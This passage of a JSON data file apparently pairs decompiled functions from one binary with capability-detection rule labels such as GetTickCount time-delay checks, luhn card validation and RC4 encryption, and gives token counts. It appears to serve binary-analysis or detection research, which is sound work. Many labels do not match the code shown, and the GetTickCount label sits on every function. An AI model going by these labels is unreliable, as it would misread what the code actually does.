        "decompiled_code": "\nvoid fcn.0001f84c(ulong arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint32_t uVar6;\n    char in_R8B;\n    uchar auStackX32 [8];\n    uchar auStack328 [280];\n    \n    iVar1 = fcn.000307e0();\n    fcn.00031f44(arg2 & 0xffffffff, auStack328, 0x104);\n    uVar3 = 0;\n    if (in_R8B == '\\0') {\n        if ((0x1a < iVar1) && (iVar1 = fcn.000667ee(auStack328, 0x11d68),  iVar1 == 0)) {\n            fcn.0003e70c(arg2 & 0xffffffff);\n        }\n        fcn.00032650(0x7e7f0, auStackX32, 1);\n        piVar2 = *0x7e810;\n        if (*0x7e808 != 0) {\n            do {\n                if (*piVar2 == arg2) break;\n                uVar6 = uVar3 + 1;\n                uVar3 = uVar6;\n                piVar2 = piVar2 + 2;\n            } while (uVar6 < *0x7e808);\n            uVar6 = uVar3;\n            if (uVar6 < *0x7e808 - 1) {\n                do {\n                    fcn.00066752(*0x7e810 + uVar3 * 2);\n                    uVar6 = uVar3 + 1;\n                    uVar3 = uVar6;\n                } while (uVar6 < *0x7e808 - 1);\n            }\n            if (uVar6 < *0x7e808) {\n                uVar6 = *0x7e808 - 1;\n                uVar3 = *0x7e808;\n                *0x7e808 = uVar6;\n                fcn.00031630(0x7e810, uVar3 << 3, uVar6 << 3);\n            }\n        }\n        fcn.00032684(0x7e7f0, auStackX32, 1);\n        fcn.00057520(auStack328, arg2 & 0xffffffff);\n        fcn.0001e974(arg2 & 0xffffffff);\n    }\n    else {\n        uVar5 = uVar3;\n        uVar6 = *0x7eb68;\n        if (*0x7eb68 != 0) {\n            do {\n                if (*(*0x7eb70 + uVar5) == arg1) {\n                    fcn.0001e8bc(arg2 & 0xffffffff);\n                    uVar6 = *0x7eb68;\n                }\n                uVar4 = uVar3 + 1;\n                uVar3 = uVar4;\n                uVar5 = uVar5 + 8;\n            } while (uVar4 < uVar6);\n        }\n        if ((0x1a < iVar1) && (iVar1 = fcn.000667ee(auStack328, 0x11d68),  iVar1 == 0)) {\n            fcn.0003f2d0(arg2);\n        }\n    }\n    return;\n}\n",
        "token_count": 760
    },
    "00020210": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00020210(uint64_t *arg1, ulong arg2, ulong arg3, uint8_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uStackX32;\n    int32_t in_stack_00000028;\n    uchar auStack200 [144];\n    ulong var_1h;\n    \n    if (arg2 < 8) {\n        uStackX32 = 0;\n        fcn.0006670a(&uStackX32, arg1, arg2);\n    }\n    else {\n        uStackX32 = *arg1;\n    }\n    uVar1 = (in_stack_00000028 - *arg4) - 1;\n    uStackX32 = uStackX32 & 0xffffffff00000000 | uStackX32 ^ uVar1;\n    if (uVar1 != 0) {\n        fcn.0002d030(auStack200, arg2, arg1);\n        fcn.0002ca20(arg4 + 1, arg3, in_stack_00000028 - 1, auStack200);\n    }\n    return uVar1;\n}\n",
        "token_count": 277
    },
    "00020c94": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00020c94(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((arg2 < 0x40000001) && (arg1 != 0)) {\n        fcn.000206a8(arg1);\n        (**(*(arg1 + 0x58) + 0x38))(*(arg1 + 0x60), 2);\n        iVar1 = (**(*(arg1 + 0x58) + 0x18))(*(arg1 + 0x60), arg2);\n        if (iVar1 != 0) {\n            fcn.00020a98(arg1);\n            return 0xffffffff;\n        }\n        *(arg1 + 0x2c) = *(arg1 + 0x2c) + 1;\n        *(arg1 + 8) = arg2;\n        iVar1 = (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), arg1 + 8, 0x2c);\n        if (iVar1 == 0) {\n            uVar2 = fcn.00020a98(arg1);\n            (**(*(arg1 + 0x58) + 0x38))(*(arg1 + 0x60), 1);\n            return uVar2;\n        }\n    }\n    return 3;\n}\n",
        "token_count": 306
    },
    "0002346c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0002346c(char *arg1, char *arg2, ulong arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    char *pcVar8;\n    uchar auStack648 [20];\n    int32_t iStack628;\n    char acStack600 [272];\n    char acStack328 [280];\n    \n    uVar6 = 0xffffffffffffffff;\n    uVar3 = uVar6;\n    pcVar5 = arg1;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    uVar4 = uVar6;\n    pcVar5 = arg2;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    if (0x104 < ~uVar3 + (~uVar4 - 2)) {\n        return 0xffffffff;\n    }\n    pcVar5 = arg1;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5[acStack328 + -arg1] = cVar1;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    uVar3 = fcn.00066824(acStack328, 0x2e);\n    uVar4 = fcn.00066824(acStack328, 0x5c);\n    if (uVar3 == 0) {\ncode_r0x00023528:\n        uVar3 = uVar6;\n        pcVar5 = acStack328;\n        do {\n            pcVar8 = pcVar5;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar8;\n        } while (cVar1 != '\\0');\n        iVar7 = 0;\n        do {\n            cVar1 = arg2[iVar7];\n            pcVar8[iVar7 + -1] = cVar1;\n            iVar7 = iVar7 + 1;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        if ((uVar4 != 0) && (uVar3 < uVar4)) {\n            uVar3 = 0;\n        }\n        if (uVar3 == 0) goto code_r0x00023528;\n        iVar7 = uVar3 - arg2;\n        do {\n            cVar1 = *arg2;\n            arg2[iVar7] = cVar1;\n            arg2 = arg2 + 1;\n        } while (cVar1 != '\\0');\n    }\n    iVar2 = fcn.000319f8(acStack328, auStack648);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    if (iStack628 == 0) {\n        return 0xffffffff;\n    }\n    iVar2 = fcn.000319f8(arg1, auStack648);\n    if (iVar2 != 0) {\n        iVar2 = fcn.00022ffc(acStack328, arg1);\n        if (iVar2 == -1) {\n            return 0xffffffff;\n        }\n        goto code_r0x00023699;\n    }\n    pcVar5 = arg1;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5[acStack600 + -arg1] = cVar1;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    uVar3 = fcn.00066824(acStack600, 0x2e);\n    uVar4 = fcn.00066824(acStack600);\n    if (uVar3 == 0) {\ncode_r0x000235ee:\n        pcVar5 = acStack600;\n        do {\n            pcVar8 = pcVar5;\n            if (uVar6 == 0) break;\n            uVar6 = uVar6 - 1;\n            pcVar8 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar8;\n        } while (cVar1 != '\\0');\n        iVar7 = 0;\n        do {\n            cVar1 = *(iVar7 + 0x11efc);\n            pcVar8[iVar7 + -1] = cVar1;\n            iVar7 = iVar7 + 1;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        if ((uVar4 != 0) && (uVar3 < uVar4)) {\n            uVar3 = 0;\n        }\n        if (uVar3 == 0) goto code_r0x000235ee;\n        pcVar5 = 0x11efc;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5[uVar3 - 0x11efc] = cVar1;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n    }\n    iVar2 = fcn.000319f8(acStack600, auStack648);\n    if (((iVar2 != 0) || (iVar2 = fcn.00031afc(acStack600),  iVar2 != -1)) &&\n       (iVar2 = fcn.00031e0c(arg1, acStack600),  iVar2 != -1)) {\n        iVar2 = fcn.00022ffc(acStack328, arg1);\n        if (iVar2 != -1) {\ncode_r0x00023699:\n            if (arg3 != 0) {\n                fcn.00031afc(acStack328);\n            }\n            return 0;\n        }\n        fcn.00031afc(arg1);\n        fcn.00031e0c(acStack600, arg1);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 1396
    },
    "00025a44": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00025a44(ulong noname_0, ulong noname_1, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint32_t auStackX32 [2];\n    int64_t aiStack40 [3];\n    \n    uVar3 = 0;\n    aiStack40[0] = 0;\n    iVar1 = fcn.00022138(noname_0, noname_1, auStackX32, aiStack40);\n    if (iVar1 == 0) {\n        uVar4 = uVar3;\n        if (auStackX32[0] != 0) {\n            do {\n                if ((arg3 <= *(uVar3 + 0xc + aiStack40[0])) && (-1 < *(uVar3 + 0xc + aiStack40[0]))) {\n                    *(uVar3 + 4 + aiStack40[0]) = 0xffffffff;\n                }\n                uVar2 = uVar4 + 1;\n                uVar3 = uVar3 + 0x40;\n                uVar4 = uVar2;\n            } while (uVar2 < auStackX32[0]);\n        }\n        fcn.00022288(aiStack40[0], auStackX32[0]);\n        fcn.000207c4(aiStack40[0]);\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = iVar1 + 0x191U | 0x21590000;\n    }\n    return uVar2;\n}\n",
        "token_count": 359
    },
    "00025c04": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.00025c04(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    \n    iVar3 = 0;\n    if (*0x7ec48 == NULL) {\n        iVar3 = 0;\n    }\n    else {\n        fcn.00030310(0x7ec40);\n        iVar7 = 0;\n        piVar5 = *0x7ec48;\n        do {\n            if (*piVar5 != 0) {\n                piVar4 = *0x7ec48 + iVar7 * 0x35 + 1;\n                iVar6 = arg1 - piVar4;\n                do {\n                    cVar1 = *piVar4;\n                    cVar2 = *(piVar4 + iVar6);\n                    if (cVar1 != cVar2) break;\n                    piVar4 = piVar4 + 1;\n                } while (cVar2 != '\\0');\n                if (cVar1 == cVar2) {\n                    piVar4 = *0x7ec48 + iVar7 * 0x35 + 0x11;\n                    iVar6 = (arg1 + 0x80) - piVar4;\n                    do {\n                        cVar1 = *piVar4;\n                        cVar2 = *(piVar4 + iVar6);\n                        if (cVar1 != cVar2) break;\n                        piVar4 = piVar4 + 1;\n                    } while (cVar2 != '\\0');\n                    if (cVar1 == cVar2) {\n                        iVar3 = (*0x7ec48)[iVar7 * 0x35];\n                        (*0x7ec48)[iVar7 * 0x35] = 0;\n                        break;\n                    }\n                }\n            }\n            iVar7 = iVar7 + 1;\n            piVar5 = piVar5 + 0x35;\n        } while (iVar7 < 0x14);\n        fcn.00030378(0x7ec40);\n    }\n    return iVar3;\n}\n",
        "token_count": 479
    },
    "00027a4c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00027a4c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t in_stack_00000028;\n    \n    iVar1 = fcn.000226e8(0xfffffffe, 4, in_stack_00000028, 0);\n    if (iVar1 == 4) {\n        iVar1 = fcn.0002748c(2, 0);\n        fcn.00025a44(0xfffffffe, 4, iVar1 + 1);\n        fcn.000226e8(0xfffffffe, 4, in_stack_00000028, 0);\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "000289a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.000289a0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong *puVar3;\n    ulong in_stack_00000028;\n    \n    uVar2 = (*(*0x7edd0)[0x23])();\n    if (uVar2 == 0x21590001) {\n        fcn.00032174(0x7edb0);\n        uVar2 = uVar2 & 0xffffffff;\n        for (puVar3 = **0x7edd0; puVar3 != NULL; puVar3 = *puVar3) {\n            if (puVar3[0x23] != NULL) {\n                uVar1 = (*puVar3[0x23])(arg1, arg2, arg3, arg4, in_stack_00000028);\n                uVar2 = uVar1;\n                if (uVar1 != 0x21590001) break;\n            }\n        }\n        fcn.000321f4(0x7edb0);\n    }\n    return uVar2;\n}\n",
        "token_count": 253
    },
    "0002bccc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t * fcn.0002bccc(uint64_t *arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t **ppiVar4;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    ulong in_R9;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint uVar10;\n    \n    ppiVar4 = NULL;\n    ppiVar6 = ppiVar4;\n    if (0x14 < arg2) {\n        do {\n            uVar8 = *arg1;\n            uVar9 = arg1[1];\n            uVar10 = *(arg1 + 2);\n            uVar1 = fcn.00030dc8(uVar8 & 0xffffffff);\n            uVar7 = uVar1;\n            uVar2 = fcn.00030dc8(uVar8 >> 0x20);\n            uVar8 = uVar7 & 0xffffffff | uVar2 << 0x20;\n            if (arg2 - 0x15 < uVar2) {\n                return ppiVar6;\n            }\n            ppiVar4 = fcn.00030c98(0x28);\n            if (ppiVar4 == NULL) {\n                return ppiVar6;\n            }\n            fcn.0006677c(ppiVar4, 0, 0x28, in_R9, uVar8, uVar9, uVar10);\n            *(ppiVar4 + 1) = uVar1;\n            *(ppiVar4 + 2) = uVar2;\n            *(ppiVar4 + 0xc) = uVar9;\n            if (uVar2 < 8) {\n                ppiVar4[3] = ppiVar4 + 4;\n            }\n            else {\n                piVar5 = fcn.00030c98(uVar2);\n                ppiVar4[3] = piVar5;\n                if (piVar5 == NULL) {\n                    *(ppiVar4 + 2) = 0;\n                }\n            }\n            fcn.0006670a(ppiVar4[3], arg1 + 0x15);\n            arg1 = arg1 + 0x15 + uVar2;\n            arg2._0_4_ = (arg2 - 0x15) - uVar2;\n            iVar3 = fcn.000203ac(*(ppiVar4 + 0xc), ppiVar4[3], *(ppiVar4 + 2));\n            if (iVar3 == 0) {\n                *(ppiVar4 + 2) = 0;\n            }\n            *ppiVar4 = ppiVar6;\n            ppiVar6 = ppiVar4;\n        } while (0x14 < arg2);\n    }\n    return ppiVar4;\n}\n",
        "token_count": 640
    },
    "0002ecf0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.0002ecf0(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    ulong uVar1;\n    uchar auStack184 [152];\n    \n    if (((arg3 & 0x1ff) == 0) && (arg3 <= *(arg1 * 8 + 0x7eea8) - 0x200U)) {\n        fcn.0002d030(auStack184, 0x10, 0x69fa8);\n        fcn.0002ca20(arg2, arg3 + *(arg1 * 8 + 0x7ee98), 0x200, auStack184);\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 177
    },
    "00030384": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.00030384(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    ulong auStackX24 [2];\n    uchar auStack104 [16];\n    uint auStack88 [2];\n    ulong uStack80;\n    uchar *puStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    \n    uVar3 = fcn.00032390(auStackX24);\n    if (uVar3 == 0) {\n        iVar4 = fcn.0003292c(arg2);\n        iVar4 = fcn.00030c98(iVar4 * 2);\n        if (iVar4 == 0) {\n            iVar1 = -0x3fffff66;\n        }\n        else {\n            fcn.0003285c(arg2, iVar4, 0xffffffffffffffff);\n            fcn.00066704(auStack104, iVar4);\n            puStack72 = auStack104;\n            auStack88[0] = 0x30;\n            uStack56 = auStackX24[0];\n            uStack80 = 0;\n            uStack64 = 0;\n            uStack48 = 0;\n            iVar1 = fcn.0001f258(arg1, 0x1f0001, auStack88);\n        }\n        fcn.00030d24(iVar4);\n        fcn.000324b8(auStackX24[0]);\n        uVar3 = 0;\n        if (iVar1 != 0) {\n            uVar2 = fcn.00066782(iVar1);\n            uVar3 = uVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 395
    },
    "00030538": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00030538(ulong *arg1)\n\n{\n    int32_t iVar1;\n    ulong auStackX16 [3];\n    \n    auStackX16[0] = 0;\n    iVar1 = fcn.000667be(*arg1, 0, auStackX16);\n    return iVar1 == 0;\n}\n",
        "token_count": 75
    },
    "000305f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.000305f0(uint64_t arg1, uint64_t *arg2)\n\n{\n    ulong uVar1;\n    \n    if ((((arg1 & 0xffffffff80000000) == 0xffffffff80000000) && (arg1 != 0xfffffffffffffffe)) &&\n       (arg1 != 0xffffffffffffffff)) {\n        *arg2 = arg1;\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00066884(0xffffffffffffffff, arg1, 0xffffffffffffffff, arg2, 0, 0x200, 2);\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00030650": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00030650(int64_t arg1, int64_t arg2)\n\n{\n    if ((arg1 != arg2) && (arg2 != 0)) {\n        fcn.000666f2(arg2);\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00030858": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00030858(uint8_t *arg1, uint8_t *arg2, int64_t arg3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0;\n    uVar3 = 0;\n    while (arg3 != 0) {\n        uVar1 = *arg1;\n        uVar2 = uVar1;\n        arg3 = arg3 + -1;\n        arg1 = arg1 + 1;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar2 = uVar1 + 0x20;\n        }\n        uVar1 = *arg2;\n        uVar3 = uVar1;\n        arg2 = arg2 + 1;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar3 = uVar1 + 0x20;\n        }\n        if ((uVar2 == 0) || (uVar2 != uVar3)) break;\n    }\n    return uVar2 - uVar3;\n}\n",
        "token_count": 253
    },
    "00031248": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00031248(char *arg1, char **arg2, ulong arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint auStackX16 [6];\n    \n    iVar2 = fcn.00066890(arg1, arg3, auStackX16);\n    if (iVar2 != 0) {\n        auStackX16[0] = 0;\n    }\n    if (arg2 != NULL) {\n        for (; (((cVar1 = *arg1,  '/' < cVar1 && (cVar1 < ':')) || (('`' < cVar1 && (cVar1 < 'g')))) ||\n               (('@' < cVar1 && (cVar1 < 'G')))); arg1 = arg1 + 1) {\n        }\n        *arg2 = arg1;\n    }\n    return auStackX16[0];\n}\n",
        "token_count": 195
    },
    "00031398": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00031398(int16_t *arg1, ulong arg2, char *arg3)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int16_t *piVar4;\n    uint64_t arg2_00;\n    ulong uVar5;\n    ulong var_1h;\n    \n    arg2_00 = arg2;\n    if (*arg3 == '\\\\') {\n        fcn.0003285c(arg3, arg1, arg2_00);\n    }\n    else {\n        if ((*arg3 == '\\0') || (arg3[1] != ':')) {\n            fcn.00028f34(arg1, arg2_00);\n            iVar3 = -1;\n            uVar5 = 0x119cc;\n            piVar4 = arg1;\n            do {\n                if (iVar3 == 0) break;\n                iVar3 = iVar3 + -1;\n                iVar1 = *piVar4;\n                piVar4 = piVar4 + 1;\n            } while (iVar1 != 0);\n            iVar2 = ~iVar3 - 1;\n            arg2_00 = arg2 - iVar2;\n            piVar4 = arg1 + iVar2;\n        }\n        else {\n            uVar5 = 0x141f0;\n            piVar4 = arg1;\n        }\n        fcn.00066722(piVar4, arg2_00, uVar5, arg3);\n        arg1[arg2 - 1] = 0;\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "00031698": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00031698(ulong arg1, char *arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    ulong auStackX16 [3];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uint auStack88 [2];\n    ulong uStack80;\n    uchar *puStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    \n    uVar3 = 1;\n    if (*arg2 == 'a') {\n        uVar4 = 3;\n        if (arg2[1] == '+') {\n            uVar3 = 7;\n            uVar4 = 3;\ncode_r0x0003170d:\n            uVar2 = 0;\n        }\n        else {\n            uVar3 = 4;\n            uVar2 = 1;\n        }\n    }\n    else if (*arg2 == 'r') {\n        uVar4 = 1;\n        if (arg2[1] == '+') {\n            uVar3 = 3;\n            uVar4 = 1;\n            goto code_r0x0003170d;\n        }\n        uVar2 = 3;\n    }\n    else {\n        if (*arg2 != 'w') {\n            arg1_01 = 0x16;\n            goto code_r0x000316c2;\n        }\n        uVar2 = 0;\n        uVar4 = 5;\n        if (arg2[1] == '+') {\n            uVar3 = 3;\n            uVar2 = 0;\n        }\n        else {\n            uVar3 = 2;\n        }\n    }\n    arg1_00 = fcn.0001ca70(1, 0x208, 0x7346744e);\n    if (arg1_00 == 0) {\n        return 0;\n    }\n    fcn.00031398(arg1_00, 0x104, arg1);\n    fcn.00066704(auStack120, arg1_00);\n    puStack72 = auStack120;\n    auStack88[0] = 0x30;\n    uStack80 = 0;\n    uStack64 = 0x40;\n    uStack56 = 0;\n    uStack48 = 0;\n    iVar1 = fcn.0001e364(auStackX16, uVar3 | 0x100000, auStack88, auStack104, 0, 0x80, uVar2, uVar4, 0x10, 0, 0);\n    fcn.00030d24(arg1_00);\n    if (iVar1 == 0) {\n        return auStackX16[0];\n    }\n    uVar3 = fcn.00066782();\n    arg1_01 = uVar3;\ncode_r0x000316c2:\n    fcn.00030e10(arg1_01);\n    return 0;\n}\n",
        "token_count": 680
    },
    "00032284": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00032284(int64_t arg1)\n\n{\n    bool bVar1;\n    \n    (*_fcn.00011630)(*(arg1 + 0x10) + 0x40, 0, 0, 0, 0);\n    bVar1 = *(arg1 + 8) == 0;\n    if (bVar1) {\n        *(arg1 + 8) = 0xffffffff;\n    }\n    else {\n        *(arg1 + 4) = *(arg1 + 4) + 1;\n    }\n    (**0x113b0)(*(arg1 + 0x10) + 0x40, 0);\n    if (!bVar1) {\n        (*_fcn.00011630)(*(arg1 + 0x10) + 0x20, 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00032944": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00032944(ulong arg1, uint *arg2)\n\n{\n    uint uVar1;\n    char *apcStackX16 [3];\n    \n    uVar1 = fcn.00031248(arg1, apcStackX16, 0x10);\n    *arg2 = uVar1;\n    if (*apcStackX16[0] == '.') {\n        uVar1 = fcn.00031248(apcStackX16[0] + 1, apcStackX16, 0x10);\n        arg2[1] = uVar1;\n    }\n    else {\n        arg2[1] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 153
    },
    "00032b50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nulong fcn.00032b50(uint8_t *arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    ulong uVar4;\n    uint8_t *puVar5;\n    \n    uVar3 = 0;\n    iVar2 = 0;\n    uVar4 = 1;\n    while( true ) {\n        puVar5 = arg1;\n        uVar1 = *puVar5;\n        if ((((uVar1 < 0x41) || (0x5a < uVar1)) && ((uVar1 < 0x61 || (0x7a < uVar1)))) &&\n           ((uVar1 < 0x30 || (0x39 < uVar1)))) break;\n        iVar2 = iVar2 + 1;\n        uVar3 = uVar3 + uVar1;\n        arg1 = puVar5 + 1;\n        if (7 < iVar2) {\n            if ((puVar5[1] != uVar3 / 0x1a + 0x41) || (puVar5[2] != 0x7a - uVar3 % 0x1a)) {\n                uVar4 = 0;\n            }\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 294
    },
    "00032bc8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nulong fcn.00032bc8(uint8_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    ulong uVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    \n    uVar5 = 0;\n    iVar1 = 0;\n    uVar3 = 1;\n    while( true ) {\n        puVar4 = arg1;\n        uVar2 = *puVar4;\n        if (uVar2 + 0xbf < 0x1a) {\n            uVar2 = uVar2 + 0x20;\n        }\n        if (0x19 < uVar2 + 0x9f) break;\n        iVar1 = iVar1 + 1;\n        uVar5 = uVar5 + uVar2;\n        arg1 = puVar4 + 1;\n        if (7 < iVar1) {\n            if ((puVar4[1] != uVar5 / 0x1a + 0x61) || (puVar4[2] != 0x7a - uVar5 % 0x1a)) {\n                uVar3 = 0;\n            }\n            return uVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 280
    },
    "0003335c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0003335c(ulong arg1)\n\n{\n    int64_t iVar1;\n    uchar auStackX16 [24];\n    \n    fcn.00032650(0x7f8f0, auStackX16, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    fcn.00032684(0x7f8f0, auStackX16, 0);\n    return iVar1 != 0;\n}\n",
        "token_count": 106
    },
    "00033a68": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00033a68(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    bool bVar3;\n    uchar auStackX32 [8];\n    \n    bVar3 = false;\n    fcn.00032650(0x7f8f0, auStackX32, 0);\n    iVar2 = fcn.00032d34(arg1, 1);\n    if ((iVar2 != 0) && (*(iVar2 + 0x438) != 0)) {\n        iVar1 = fcn.00055d30(*(iVar2 + 0x438), arg2, arg3, arg3);\n        bVar3 = iVar1 != 0;\n    }\n    fcn.00032684(0x7f8f0, auStackX32, 0);\n    return bVar3;\n}\n",
        "token_count": 198
    },
    "00033ae0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
